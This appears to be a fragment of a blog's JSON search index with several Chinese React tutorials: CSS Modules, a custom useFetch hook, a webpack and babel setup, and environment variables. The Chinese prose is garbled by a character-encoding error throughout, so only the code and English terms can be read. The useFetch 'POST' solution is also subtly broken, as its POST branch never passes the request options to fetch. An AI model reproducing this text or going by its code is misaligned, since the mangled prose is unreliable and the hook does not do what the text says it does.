ç‚ºå‘½åæ…£ä¾‹æ‰é€™æ¨£å‘½åï¼Œè€Œæ˜¯ä¸€å®šè¦é€™æ¨£å­å¯«æ‰èƒ½å¤ å•Ÿç”¨ module çš„åŠŸèƒ½ã€‚ æ‰€ä»¥è·Ÿå‰›å‰›ä¸€æ¨£ï¼ŒæŠŠ style å¯«é€²å»ï¼š 1234567/* button.module.css */.btn { color: white; background-color: dodgerblue; padding: 4px 8px; border: unset;} æ¥è‘—å¼•å…¥çš„æ–¹å¼ä¹Ÿæœƒæœ‰é»å°ä¸åŒï¼Œè«‹çœ‹ codeï¼š 12345import style from \"./button.module.css\";export default function Button () { return &lt;button className={style.btn}&gt;click me&lt;/button&gt;} è·Ÿå‰›å‰›ä¸ä¸€æ¨£çš„åœ°æ–¹æ˜¯æˆ‘å€‘ä¸åªæ˜¯å¼•å…¥æª”æ¡ˆè€Œå·²ï¼Œè€Œæ˜¯æ”¹ç”¨æˆ‘å€‘ä¸€èˆ¬åœ¨ä½¿ç”¨ module çš„æ–¹å¼ä¾†å¼•å…¥ï¼ˆstyleï¼‰ï¼Œæ¥è‘—å†é€é style ä¾†æŠŠä»–æ”¾å…¥ className è£¡é¢ã€‚ é€™æ¨£å­åšçš„å·®åˆ¥æ˜¯ä»€éº¼ï¼Ÿçœ‹ä¸‹é¢é€™å¼µåœ–å°±æ‡‚äº†ï¼š className æœƒè‡ªå‹•è¢«åŠ ä¸Šäº‚ç¢¼ï¼Œæ‰€ä»¥å³ä¾¿æˆ‘ç¾åœ¨åˆ°åˆ¥çš„åœ°æ–¹ä½¿ç”¨ btn é€™å€‹ className ä¹Ÿæ²’æœ‰ç”¨ï¼Œå› ç‚ºçœŸæ­£è¢«å¯«å…¥ style çš„ className ä¸æ˜¯ btnï¼Œè€Œæ˜¯ button_btn_sZrufã€‚ é€™æ˜¯æ€éº¼åšåˆ°çš„ï¼Ÿé›–ç„¶æˆ‘æ²’ç‰¹åˆ¥å»æŸ¥ï¼Œä¸éç”¨çŒœçš„è©±å¤§æ¦‚å°±æ˜¯ React åœ¨èƒŒå¾Œåšäº†ä¸€äº›è¨­å®šï¼Œåªè¦ç¢°åˆ° .module.css çš„ æª”æ¡ˆå°±æœƒåœ¨åŸæœ¬çš„ class åŠ ä¸Šä¸€ä¸²äº‚æ•¸ï¼Œæœ€å¾Œåœ¨åŒ…è£æˆä¸€å€‹ object ä¾† export å‡ºå»ã€‚ æ‰€ä»¥ä½ æœ€å¾Œ import é€²ä¾†çš„æ±è¥¿å°±æ˜¯å·²ç¶“è¢«åŒ…è£ï¼ˆæˆ–æƒ³æˆæ˜¯åŠ å·¥ï¼‰éçš„ CSS æª”ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œä½ åªè¦çŸ¥é“æ€éº¼ç”¨ï¼Ÿè·ŸçŸ¥é“é€™æ¨£åšä»¥å¾Œå°±èƒ½ç¢ºä¿ä½ çš„ CSS åªæœƒä½œç”¨åœ¨ã€Œå¼•å…¥çš„é‚£å€‹å…ƒä»¶ã€ä¸­ï¼Œé€™æ¨£å°±å·®ä¸å¤šäº†ã€‚ ä»¥ä¸Šå°±æ˜¯ CSS Module çš„ä½¿ç”¨æ–¹å¼ã€‚","link":"/2022/06/15/react-css-module/"},{"title":"Reactï¼ä¾†æä¸€å€‹ Custom hook","text":"ç†Ÿæ‚‰ä»¥å¾Œæ‡‰è©²æœƒå¾ˆå¯¦ç”¨ã€‚ ç°¡è¿°æœ€è¿‘åœ¨ä¸Š Build Web Apps with React &amp; Firebase é€™é–€èª²ï¼Œè£¡é¢æœ‰ä»‹ç´¹åˆ°å¦‚ä½•åˆ©ç”¨ hook ä¾†å»ºç«‹ä¸€å€‹ custom hookã€‚ æˆ‘è¦ºå¾—é€™æ±è¥¿é‚„è »å¯¦ç”¨çš„ï¼Œä½†æˆ‘é‚„ä¸æ˜¯å¾ˆç†Ÿï¼Œæ‰€ä»¥æƒ³é€éé€™ç¯‡ç­†è¨˜ä¾†å¤šåšä¸€é»ç·´ç¿’ã€‚ ç”¨ custom hook æœ‰ä»€éº¼å¥½è™•ï¼Ÿåœ¨å­¸ä»»ä½•ä¸€é …æ±è¥¿ä»¥å‰ï¼Œè©¦è‘—å…ˆå•è‡ªå·±ã€Œç‚ºä»€éº¼è¦ç”¨é€™å€‹æ±è¥¿ï¼Ÿã€æ˜¯æ¯”è¼ƒå¥½çš„è§€å¿µï¼Œæ‰ä¸æœƒå­¸äº†ä¸€å¤§å †æ±è¥¿å¾Œå»å®Œå…¨ä¸çŸ¥é“ç”¨é€”ã€‚ é¦–å…ˆï¼Œæˆ‘å€‘æ‹¿ä¸€å€‹æœ€å¸¸è¦‹çš„ä¾‹å­ä¾†èˆ‰ä¾‹ï¼šä¸²æ¥ API æœ€ç°¡å–®çš„ä¸²æ¥æ–¹å¼æ˜¯é€é fetchï¼Œæ­¤æ™‚ä½ çš„è…¦è¢‹ä¸­æ‡‰è©²æœƒæœ‰é€™æ¨£çš„ codeï¼š 1234567891011121314151617181920212223242526function App () { const [data, setData] = useState(null) const [error, setError] = useState(null) const [fetching, setFetching] = useState(false) useEffect(() =&gt; { setFetching(true) fetch(url) .then(response =&gt; { // å¼·åˆ¶é€²å…¥ catch å€å¡Š if (!response.ok) throw new Error(response.status) return response.json() }) .then(json =&gt; { setData(json) setFetching(false) }) .catch(error =&gt; { console.log(error.message) setError('Can not fetch data') setFetching(false) }) }, []) return ...} çœ‹èµ·ä¾†å°±æ˜¯éå¸¸æ¨™æº–çš„å¯«æ³•ï¼Œé€™æ¨£æœ‰ä»€éº¼å•é¡Œå—ï¼Ÿ å•é€™å•é¡Œä»¥å‰ï¼Œè¦å…ˆå•å•çœ‹ã€Œä½ æœ‰å¤šå°‘å…ƒä»¶æœƒç”¨åˆ° fetchï¼Ÿã€ï¼Œå¦‚æœèªªå°±åªæœ‰ä¸€å€‹ App æœƒç”¨åˆ°çš„è©±ç•¶ç„¶æ²’ä»€éº¼å•é¡Œã€‚ å¯æ˜¯å¦‚æœæœ‰å¾ˆå¤šå€‹å‘¢ï¼Ÿ é‚£ä½ å°±å¾—åœ¨æ¯ä¸€å€‹å…ƒä»¶ä¸Šéƒ½å¯«ä¸Šé‚£æ®µ boilerplateï¼Œé€™æ¨£å­è½èµ·ä¾†å°±ä¸æ˜¯é‚£éº¼å¥½äº†å§ï¼Ÿ ä½†å¦‚æœæˆ‘å€‘è‡ªå·±å¯«äº†ä¸€å€‹å°ˆé–€ç”¨ä¾†è™•ç† fetch çš„ custom hookï¼Œå°±å¯ä»¥æ”¹å¯«æˆé€™æ¨£å­ï¼š 12345import { useFetch } from \"hooks/useFetch\"function App () { const { data, error, fetching } = useFetch(url) return ...} æœ‰æ²’æœ‰çªç„¶è¦ºå¾—ä¸–ç•Œè®Šç¾å¥½äº† XDï¼Œé€™å€‹å°±æ˜¯ custom hook çš„å¨åŠ›ã€‚ å›æ­¸æ­£é¡Œï¼Œcustom hook çš„ä¸»è¦ç”¨æ„æ˜¯ç”¨ä¾†ã€ŒæŠŠé‚è¼¯æŠ½å‡ºå»ï¼Œè®“å…ƒä»¶åªè¦å°ˆæ³¨åœ¨ render é€™ä»¶äº‹æƒ…ä¸Šã€ï¼Œå¯ä»¥æƒ³æˆæ˜¯å¦ä¸€ç¨® HOCï¼ˆHigher Order Componentï¼‰ çš„æ„Ÿè¦ºã€‚ å¯¦ä½œ custom hooké€™é‚Šæœƒä»¥å‰›å‰›çš„ç¯„ä¾‹ä¾†å¯¦ä½œï¼Œæ‰€ä»¥å¦‚æœå¿˜è¨˜çš„è©±å¯ä»¥æ‹‰å›å»è¤‡ç¿’ã€‚ é †é“ä¸€æï¼Œåœ¨å¯« custom hook å‰å¯ä»¥å…ˆæ€è€ƒçœ‹çœ‹ã€Œæˆ‘å¸Œæœ›æœ€å¾Œæœƒæ€éº¼ç”¨é€™å€‹ hookï¼Ÿã€ï¼Œé€™æ¨£æœƒè®“æ•´å€‹æ€è·¯æ›´æ¸…æ™°ä¸€äº›ã€‚ å†è²¼ä¸€æ¬¡å‰›å‰›çš„ codeï¼Œæˆ‘å¸Œæœ›æœ€å¾Œæœƒé•·é€™æ¨£ï¼š 12345import { useFetch } from \"hooks/useFetch\"function App () { const { data, error, fetching } = useFetch(url) return ...} ä¹Ÿå°±æ˜¯èªªé€™å€‹ hook æœ€å¾Œå¾—å›å‚³ dataã€error å’Œ fetching é€™ä¸‰æ¨£æ±è¥¿ã€‚é€™äº›æ±è¥¿çœ‹èµ·ä¾†å°±æ˜¯æœƒã€Œè·Ÿç•«é¢é¡¯ç¤ºæœ‰é—œã€ï¼Œæ‰€ä»¥æœƒç”¨ useState ä¾†å¯¦ä½œã€‚ æ¥ä¸‹ä¾†æˆ‘æœƒç›´æ¥é™„ codeï¼Œå› ç‚ºä½ çœ‹å®Œå†ä»”ç´°æ€è€ƒä¸€ä¸‹ï¼Œå°±æœƒç™¼ç¾åªæ˜¯ã€ŒæŠŠåŸæœ¬å¯«åœ¨å…ƒä»¶è£¡çš„æ±è¥¿æŠ½å‡ºä¾†è€Œå·²ã€ï¼Œæ‰€ä»¥æˆ‘å°±ä¸è§£é‡‹å¤ªå¤šäº†ã€‚ 12345678910111213141516171819202122232425262728import { useState, useEffect } from \"react\"export function useFetch (url) { const [data, setData] = useState(null) const [error, setError] = useState(null) const [fetching, setFetching] = useState(false) useEffect(() =&gt; { setFetching(true) fetch(url) .then(response =&gt; { // å¼·åˆ¶é€²å…¥ catch å€å¡Š if (!response.ok) throw new Error(response.status) return response.json() }) .then(json =&gt; { setData(json) setFetching(false) }) .catch(error =&gt; { console.log(error.message) setError('Can not fetch data') setFetching(false) }) }, []) return {data, error, fetching}} é€™æ¨£å°±å®Œæˆå›‰ï¼æ¥è‘—å°±èƒ½åœ¨å…¶ä»–å…ƒä»¶é€é useFetch ä¾†ä½¿ç”¨äº†ã€‚ å¦‚æœæœ‰ä»»ä½•ç–‘å•çš„è©±éƒ½å¯ä»¥åˆ°æˆ‘å¯«çš„ ç¯„ä¾‹ ä¾†ç©ç©çœ‹ã€‚ å»¶ä¼¸ï¼šæˆ‘ä¸åªè¦ GETï¼Œæˆ‘é‚„æƒ³è¦ POSTé€™å€‹æ˜¯ä¸Šé¢çš„å»¶ä¼¸ç·´ç¿’ï¼Œä½ å¯ä»¥è©¦è‘—å…ˆè‡ªå·±ç·´ç¿’çœ‹çœ‹ï¼Œè¦æ€éº¼åšæ‰å¯ä»¥è®“ useFetch åŒæ™‚æ”¯æ´ GET è·Ÿ POST é€™å…©ç¨®ä¸åŒçš„æ–¹æ³•ã€‚ çµ¦ä½ ä¸€äº›æç¤ºï¼š é€™ä»£è¡¨æˆ‘å€‘åœ¨ç”¨ useFetch æ™‚å¾—å¤šå‚³å…¥ä¸€å€‹åƒæ•¸è®“ä»–çŸ¥é“è¦ç”¨ GET / POST å¦‚æœæ˜¯ POST çš„è©±æœƒéœ€è¦å‚³å…¥è³‡æ–™ï¼ˆbodyï¼‰ã€‚é€™å€‹æœƒæœ‰å…©ç¨®åšæ³•ï¼Œä¸€ç¨®æ˜¯ç•¶ä½œåƒæ•¸å‚³çµ¦ useFetchï¼Œå¦ä¸€ç¨®æ˜¯åœ¨ useFetch ä¸­å®šç¾©æ–°çš„ stateã€‚ä½ å¯ä»¥æƒ³åˆ°ç¬¬äºŒç¨®è©²æ€éº¼åšå—ï¼Ÿ æƒ³å¥½çš„è©±å°±å¯ä»¥å¾€ä¸‹çœ‹è§£ç­”äº†ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import { useState, useEffect } from \"react\";// å¦‚æœæ²’æœ‰å‚³ï¼ŒæŠŠé è¨­å€¼è¨­ç‚º GETexport function useFetch(url, method = \"GET\") { const [data, setData] = useState(null); const [error, setError] = useState(null); const [fetching, setFetching] = useState(false); // æ–°å¢ä¸€å€‹ç”¨ä¾†å„²å­˜è³‡æ–™çš„ state const [options, setOptions] = useState(null); // ç‚ºäº†è®“å…ƒä»¶å¯ä»¥æ›´æ–° optionsï¼Œæ–°é–‹ä¸€å€‹ setter const setPostData = (data) =&gt; { setOptions({ method: \"POST\", headers: { \"Content-Type\": \"application/json\" }, body: JSON.stringify(data) }); }; useEffect(() =&gt; { // æ ¹æ“š options ä¾†æ±ºå®šåŸ·è¡Œå“ªä¸€æ®µ fetch if (method === \"GET\") { setFetching(true); fetch(url) .then((response) =&gt; { if (!response.ok) throw new Error(response.status); return response.json(); }) .then((json) =&gt; { setData(json); setFetching(false); }) .catch((error) =&gt; { console.log(error.message); setError(\"Can not fetch data\"); setFetching(false); }); } if (method === \"POST\" &amp;&amp; options) { setFetching(true); fetch(url) .then((response) =&gt; { if (!response.ok) throw new Error(response.status); return response.json(); }) .then((json) =&gt; { setData(json); setFetching(false); }) .catch((error) =&gt; { console.log(error.message); setError(\"Can not send request\"); setFetching(false); }); } }, [url, options]); return { data, error, fetching, setPostData };} ç°¡å–®ä¾†èªªå°±æ˜¯åˆ¤æ–· method ä¾†åŸ·è¡Œå°æ‡‰çš„ fetch å°±è¡Œäº†ï¼Œä¸å¤ªæ‡‚çš„è©±å¯ä»¥åˆ°é€™é‚Šä¾†çœ‹ç¯„ä¾‹ã€‚ å¦å¤–å¦‚æœä½ è¦ºå¾—é€™æ¨£å­å¾ˆæ”é•·ï¼ˆfetch çš„éƒ¨åˆ†ï¼‰ï¼Œæƒ³åŒ…è£æˆ function çš„è©±çµ•å°æ²’å•é¡Œï¼Œä½†é€™é‚Šå°±ä¸ç¤ºç¯„äº†ï¼Œç•™çµ¦ä½ è‡ªå·±ä¾†ç·´ç¿’ã€‚","link":"/2022/06/17/react-custom-hook/"},{"title":"å¾é›¶é–‹å§‹å»ºç«‹ä¸€å€‹ React é–‹ç™¼ç’°å¢ƒ","text":"é›–ç„¶æµç¨‹ä¸Šéº»ç…©äº†é»ï¼Œä½†èƒ½å¹«åŠ©ä½ ç†è§£èƒŒå¾Œçš„åŸç†ã€‚ ç°¡è¿°é›–ç„¶è¦å»ºç«‹ä¸€å€‹ React ç’°å¢ƒå¯ä»¥ç”¨ create-react-app ä¾†ä¸€éµå®Œæˆï¼Œä½†æ˜¯æˆ‘è¦ºå¾—é‚„æ˜¯è¦è‡ªå·±è·‘ä¸€æ¬¡é€™èƒŒå¾Œçš„æµç¨‹æœƒæ›´æ¸…æ¥šä¸€äº›ã€‚ ç°¡å–®ä¾†èªª React çš„èƒŒå¾Œä¸»è¦å°±æ˜¯å…©å€‹æ±è¥¿ï¼š webpack babel webpack æ˜¯ç”¨ä¾†è™•ç† import è·Ÿ require çš„èªæ³•ï¼Œè€Œ babel å‰‡æ˜¯ç”¨ä¾†è™•ç† ES ç‰ˆæœ¬å•é¡Œè·Ÿ React å…§éƒ¨çš„æ±è¥¿ï¼ˆJSXï¼‰ã€‚ webpacké¦–å…ˆå®‰è£ webpack 1npm install webpack webpack-cli æ¥è‘—æ–°å¢è¨­å®šæª”ï¼š 123456789// webpack.config.jsconst path = require(\"path\");module.exports = { entry: \"./src/index.js\", output: { path: path.join(__dirname, \"/dist\"), filename: \"bundle.js\" }} æ¥è‘—è¨­å®š package.jsonï¼š 12345\"scripts\": { \"start\": \"webpack --mode development\", // é–‹ç™¼ç’°å¢ƒ \"build\": \"webpack --mode production\", // ç”Ÿç”¢ç’°å¢ƒ \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"} æœ€å¾Œç¢ºèªæ‰“åŒ…å‡ºä¾†çš„ bundle.js æ˜¯å¯ä»¥é‹ä½œçš„å°±æ²’å•é¡Œäº†ã€‚ babelé¦–å…ˆå®‰è£è©²è£çš„æ±è¥¿ï¼š 1npm install @babel/core babel-loader @babel/preset-env å»ºç«‹ .babelrcï¼š 123{ \"presets\": [\"@babel/preset-env\"]} å» webpack è¨­å®š loaderï¼š 12345678910111213141516171819202122const path = require('path');module.exports = { entry: \"./src/index.js\", output: { path: path.join(__dirname, \"/dist\"), filename: \"bundle.js\" }, module: { rules: [ { // æ‰€æœ‰ .js æª” test: /\\.js$/, // æ’é™¤ node_modules exclude: /node_modules/, use: { loader: \"babel-loader\" } } ] }} é€™é‚Šçš„çµæ§‹æœ‰é»å·¢ï¼Œå¯ä»¥çœ‹æˆæ˜¯ rules æœ‰å¾ˆå¤šå€‹æ‰€ä»¥æ˜¯ Arrayï¼Œè€Œæ¯ä¸€å€‹å…§å®¹éƒ½æ˜¯ä¸€åŒ… Objectï¼ŒæœƒæŒ‡å®šè¦å°å“ªäº›è³‡æºç”¨å“ªäº› loaderã€‚ æŠŠ React ä¸²æ¥èµ·ä¾†ä¸€æ¨£å…ˆæŠŠè©²è£çš„æ±è¥¿è£èµ·ä¾†ï¼š 1npm install react react-dom @babel/preset-react ç„¶å¾Œèª¿æ•´ä¸€ä¸‹ .babelrcï¼š 123{ \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"]} æ¥ä¸‹ä¾†å»ºç«‹ä¸€å€‹ç°¡å–®çš„ react componentï¼š 1234567import React, { Component } from \"react\";export default class App extends Component { render() { return &lt;h1&gt;Hello PeaNu&lt;/h1&gt; }} ç„¶å¾Œåˆ° index.js å¼•å…¥ï¼š 123456import React from \"react\";import { createRoot } from \"react-dom/client\";import App from \"./App\";const root = createRoot(document.getElementById(\"root\"))root.render(&lt;App /&gt;); åˆ¥å¿˜äº†åˆ° HTML è£¡é¢åŠ ä¸Š &lt;div id=\"root\"&gt;&lt;/div&gt;ã€‚ æ¥ä¸‹ä¾†ä¸€æ¨£æ‰“åŒ…å¾Œç¢ºèª React æ˜¯å¦èƒ½æ­£å¸¸é‹ä½œï¼Œ å¾ŒçºŒå„ªåŒ–1. å¹« bundle åŠ ä¸Š hash å¦‚æœæª”æ¡ˆåç¨±éƒ½æ²’è®Šçš„è©±ï¼Œç€è¦½å™¨æœƒæœ‰ cache æ©Ÿåˆ¶ï¼Œå°è‡´å¯èƒ½ä¸æ˜¯ç”¨åˆ°æœ€æ–°çš„ bundleï¼Œæ‰€ä»¥å°±è¦åˆ° webpack èª¿æ•´ä¸€ä¸‹è¨­å®šï¼Œè®“å®ƒè‡ªå‹•å¹«æˆ‘å€‘åŠ ä¸Š hash å€¼ 1234output: { path: path.join(__dirname, \"/dist\"), filename: \"bundle.[hash].js\" // åŠ ä¸Š [hash]}, ä½†æ˜¯é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘å€‘é‚„å¾—è™•ç† HTML å¼•å…¥ &lt;script&gt; çš„å•é¡Œï¼Œç•¢ç«Ÿæˆ‘å€‘ä¸å¯èƒ½æ¯æ¬¡éƒ½æ‰‹å‹•å»æ”¹å§ã€‚ é€™é‚Šè¦åˆ©ç”¨ webpack æä¾›çš„ plug-inï¼Œç°¡å–®ä¾†èªªå°±æ˜¯å¹«ä½ è‡ªå‹•ç”¢ç”Ÿ HTML æª”ã€‚ ä¸€æ¨£å…ˆå®‰è£èµ·ä¾†ï¼š 1npm install html-webpack-plugin ç„¶å¾Œè¨­å®š webpack.config.jsï¼š 1234567891011121314151617181920212223242526272829const path = require('path');// å¼•å…¥å¥—ä»¶const HtmlWebpackPlugin = require(\"html-webpack-plugin\");module.exports = { entry: \"./src/index.js\", output: { path: path.join(__dirname, \"/dist\"), filename: \"bundle.[hash].js\" }, module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, use: { loader: \"babel-loader\" } } ] }, // æ–°å¢è¦ç”¨çš„ plugin plugins: [ new HtmlWebpackPlugin({ template: \"./index.html\" }) ]} é™„è¨»ï¼šè¨˜å¾—æ˜¯å‚³å…¥ä¸€å€‹ç‰©ä»¶ï¼Œä¸æ˜¯ç›´æ¥å‚³è·¯å¾‘å­—ä¸²ï¼Œæé†’ä¸€ä¸‹ç•¶åˆè¸©åˆ°çš„é›·ï¼ 2. åŠ ä¸Š dev-server å› ç‚ºæ¯æ¬¡æ”¹æ±è¥¿éƒ½è¦é‡æ–° build å¯¦åœ¨å¤ªéº»ç…©äº†ï¼Œæ‰€ä»¥è¦ç”¨ dev-server ä¾†é”æˆ hot reload çš„åŠŸèƒ½ã€‚ ä¸€æ¨£æŠŠè©²è£çš„è£èµ·ä¾†ï¼š 1npm install webpack-dev-server æ¥è‘—ä¸€æ¨£æ”¹ä¸€ä¸‹ package.json çš„æŒ‡ä»¤ï¼Œåªè¦ä¸€å¥è©±å°±å¥½ï¼š 123\"scripts\": { \"start\": \"webpack-dev-server --mode development --open --hot\" } æ¥è‘—åŸ·è¡ŒæŒ‡ä»¤ï¼Œæ²’æ„å¤–çš„è©±èƒ½æˆåŠŸé–‹å•Ÿ hot reload çš„æ•ˆæœäº†ã€‚ ä»¥ä¸Šå°±æ˜¯åŸºæœ¬çš„ React ç’°å¢ƒå»ºç½®ï¼Œåˆ°é€™é‚Šä»¥å¾Œå°±å¯ä»¥æ­£å¼é€²è¡Œé–‹ç™¼äº†ã€‚","link":"/2022/05/06/react-environment-setup/"},{"title":"React-Environment-Variable","text":"å­¸èµ·ä¾†æœƒå¾ˆæ–¹ä¾¿ã€‚ ç°¡è¿°åœ¨é€²å…¥è·å ´å‰ï¼Œç’°å¢ƒè®Šæ•¸å°æˆ‘ä¾†èªªä¸»è¦æ˜¯æ‹¿ä¾†å„²å­˜ API Key ä¹‹é¡çš„æ±è¥¿ï¼Œä¸€ç›´åˆ°äº†æœ€è¿‘æˆ‘æ‰ç†è§£ç’°å¢ƒè®Šæ•¸å…¶å¯¦é‚„æœ‰å¦ä¸€å€‹ç”¨é€”æ˜¯ã€Œæ‹¿ä¾†å€åˆ†ä¸åŒç’°å¢ƒã€ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œæœ€å¸¸è¦‹çš„å·®ç•°æ˜¯é–‹ç™¼ç’°å¢ƒå’Œç”Ÿç”¢ç’°å¢ƒä¸Šçš„ API ç«¯å£å¯èƒ½æœƒä¸ä¸€æ¨£ï¼Œé€™æ™‚å€™å°±å¾ˆé©åˆç”¨ç’°å¢ƒè®Šæ•¸ä¾†è¨­å®šç«¯å£çš„å€¼ã€‚åˆæˆ–è€…èªªåœ¨ä¸åŒç’°å¢ƒä¸Šå¯èƒ½æœƒæƒ³å‘ˆç¾ä¸€äº›ä¸åŒçš„è³‡è¨Šï¼Œé€™æ™‚å€™ä¹Ÿå¾ˆé©åˆç”¨ç’°å¢ƒè®Šæ•¸ä¾†è¨­ç½®ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œé€™ç¯‡ä¸»è¦æ˜¯æƒ³ç´€éŒ„ä¸€ä¸‹åœ¨ React ä¸Šå¦‚ä½•ä½¿ç”¨ç’°å¢ƒè®Šæ•¸ã€‚ NODE_ENVç•¶æˆ‘å€‘åœ¨ç”¨ npm run startã€npm run buildã€ npm run test æ™‚å…¶å¯¦é è¨­æœƒè‡ªå‹•ä¾†å¸¶å…¥ NODE_ENV é€™å€‹ç’°å¢ƒè®Šæ•¸ï¼Œè€Œé€™å€‹å€¼æœƒé¡¯ç¤ºç›®å‰çš„ç’°å¢ƒæ˜¯ä»€éº¼ï¼š development production test æ›å¥è©±èªªï¼Œå…¶å¯¦ä½ å¯ä»¥æŠŠ react é è¨­çµ¦ä½ çš„æŒ‡ä»¤æƒ³æˆæ˜¯é€™æ¨£ï¼š 123456\"scripts\": { \"start\": \"NODE_ENV=development react-scripts start\", \"build\": \"NODE_ENV=production react-scripts build\", \"test\": \"NODE_ENV=test react-scripts test\", \"eject\": \"react-scripts eject\"} åªæ˜¯é€™äº›å€¼æ˜¯ä¸èƒ½ä¿®æ”¹çš„ï¼Œæ‰€ä»¥åœ¨å¯¦éš›æƒ…æ³ä¸­ä½ ä¸æœƒçœ‹åˆ° NODE_ENV=xxxx é€™æ¨£çš„è¨­å®šã€‚ ä¾†èˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­æˆ‘å€‘æœ‰åº•ä¸‹çš„ Codeï¼š 12345678910function App() { return ( &lt;div className='App'&gt; &lt;header className='App-header'&gt; &lt;img src={logo} className='App-logo' alt='logo' /&gt; &lt;p&gt;Env: {process.env.NODE_ENV}&lt;/p&gt; &lt;/header&gt; &lt;/div&gt; )} åœ¨ Dev ç’°å¢ƒï¼ˆnpm run startï¼‰ä¸Šè·‘çš„çµæœæœƒæ˜¯ï¼š åœ¨ Production ç’°å¢ƒï¼ˆnpm run buildï¼‰ä¸Šè·‘çš„çµæœƒæ˜¯ï¼š é€éçµ‚ç«¯ä¸Šè¼¸å…¥ Env è®Šæ•¸å‡è¨­ç›®å‰çš„ Code é•·é€™æ¨£ï¼š 12345678910function App() { return ( &lt;div className='App'&gt; &lt;header className='App-header'&gt; &lt;img src={logo} className='App-logo' alt='logo' /&gt; &lt;p&gt;Env: {process.env.REACT_APP_DEMO_CODE}&lt;/p&gt; &lt;/header&gt; &lt;/div&gt; )} ç‚ºäº†è®€å–åˆ° REACT_APP_DEMO_CODE é€™å€‹è®Šæ•¸ï¼Œæˆ‘å€‘å¯ä»¥åœ¨åŸ·è¡Œ react-script ä¹‹å‰æŠŠè®Šæ•¸å¯«é€²å»ï¼š æˆ–è€…æ˜¯å¯«åœ¨ package.json ä¸­ï¼ˆå…©å€‹èƒŒå¾Œçš„åŸ·è¡Œæ–¹å¼æ˜¯ä¸€æ¨£çš„ï¼‰ï¼š 123456\"scripts\": { \"start\": \"REACT_APP_DEMO_CODE=PeaNu react-scripts start\", \"build\": \"react-scripts build\", \"test\": \"react-scripts test\", \"eject\": \"react-scripts eject\"} é€™é‚Šçš„åŸ·è¡Œçµæœé•·é€™æ¨£ï¼š é€é .env æª”æ¡ˆä¾†è¼¸å…¥è®Šæ•¸Create React App é è¨­æœƒè‡ªå‹•å­˜å–é€™å¹¾å€‹ .env æª”æ¡ˆï¼š .envï¼šå¯ä»¥åœ¨æ‰€æœ‰ç’°å¢ƒä¸­å­˜å–ï¼Œé™¤äº† test .env.localï¼šå¯ä»¥åœ¨æ‰€æœ‰ç’°å¢ƒä¸­å­˜å–ï¼Œé™¤äº† testï¼ˆæ›´å¼·çš„å„ªå…ˆæ¬Šï¼‰ .env.development, .env.test, .env.productionï¼šå¯ä»¥åœ¨æŒ‡å®šçš„é‚„å¢ƒä¸­å­˜å– .env.development.local, .env.test.local, .env.production.localï¼šå¯ä»¥åœ¨æŒ‡å®šçš„é‚„å¢ƒä¸­å­˜å–ï¼ˆæ›´å¼·çš„å„ªå…ˆæ¬Šï¼‰ æ‰€ä»¥ä½ åªè¦å»ºç«‹ç¬¦åˆé€™äº›åç¨±çš„æª”æ¡ˆä»¥å¾Œï¼Œå°±å¯ä»¥ç›´æ¥åœ¨å°ˆæ¡ˆä¸­å­˜å–åˆ°é€™äº› Env è®Šæ•¸ã€‚ æœƒåˆ†æˆé€™éº¼å¤šçš„åŸå› ä¸»è¦æ˜¯ç‚ºäº†é‡å°ä¸åŒç’°å¢ƒä¾†è®€å–ä¸åŒçš„ Env è®Šæ•¸ï¼Œç­‰ä¸€ä¸‹æœƒåœ¨è§£é‡‹ä»–å€‘å¯¦éš›çš„å·®åˆ¥ï¼Œé€™é‚Šå…ˆä¾†çœ‹å€‹ç¤ºç¯„ã€‚ é¦–å…ˆåœ¨æ ¹ç›®éŒ„å»ºç«‹ .env æª”æ¡ˆï¼Œä¸¦å¡«å…¥åº•ä¸‹å…§å®¹ï¼š 1REACT_APP_DEMO_CODE='Hello PeaNu' æ¥è‘—å°±èƒ½å­˜å–åˆ°é€™å€‹è®Šæ•¸äº†ï¼š é †é“ä¸€æï¼Œå› ç‚ºé€™é‚Šç¤ºç¯„ç”¨çš„æ˜¯ .env æª”æ¡ˆï¼Œæ‰€ä»¥ä¸ç®¡æ˜¯ development æˆ– production éƒ½å¯ä»¥å­˜å–é€™å€‹è®Šæ•¸ã€‚ æ‰€ä»¥é€™å¹¾å€‹æª”æ¡ˆçš„å·®åˆ¥åœ¨å“ªï¼Ÿæˆ‘å€‘å…ˆä¾†çœ‹å®˜æ–¹æ–‡ä»¶ï¼Œå®ƒå…¶å¯¦æœ‰æåˆ°æ¯å€‹ .env æª”æ¡ˆä¹‹é–“çš„ã€Œå„ªå…ˆæ¬Šã€ï¼š npm start: .env.development.local, .env.local, .env.development, .env npm run build: .env.production.local, .env.local, .env.production, .env npm test: .env.test.local, .env.test, .env (note .env.local is missing) é™„è¨»ï¼šï¼ˆå„ªå…ˆé †åºæ˜¯å·¦é‚Š &gt; å³é‚Šï¼‰ èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœä½ çš„å°ˆæ¡ˆåŒæ™‚å­˜åœ¨ .env å’Œ .env.local æ™‚ï¼Œåœ¨ npm run start çš„æƒ…å¢ƒä¸‹æœƒæ¡ç”¨ env.local çš„å…§å®¹ï¼Œ.env å°±ä¸æœƒè¢«å­˜å–åˆ°ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ä»¥æ­¤é¡æ¨ã€‚ å­˜å– package.json ä¸­çš„å…§å®¹å‡è¨­æˆ‘å€‘çš„ package.json æœ‰é€™äº›å…§å®¹ï¼š 1234567{ \"name\": \"my-awesome-project\", \"version\": \"0.1.0\", \"homepage\": \".\", \"private\": true // ...} å¦‚æœæˆ‘å€‘æƒ³é€é .env ä¾†å­˜å–é€™äº›å…§å®¹çš„è©±ï¼Œå¯ä»¥ç”¨ $ ä¾†å­˜å–è®Šæ•¸ï¼š 12REACT_APP_VERSION=$npm_package_versionREACT_APP_NAME=$npm_package_name æ¥è‘—åœ¨ Code è£¡é¢å­˜å–é€™äº› Env è®Šæ•¸å°±å¯ä»¥æ‹¿åˆ°å°æ‡‰çš„å€¼äº†ï¼š 12345678910111213function App() { return ( &lt;div className='App'&gt; &lt;header className='App-header'&gt; &lt;img src={logo} 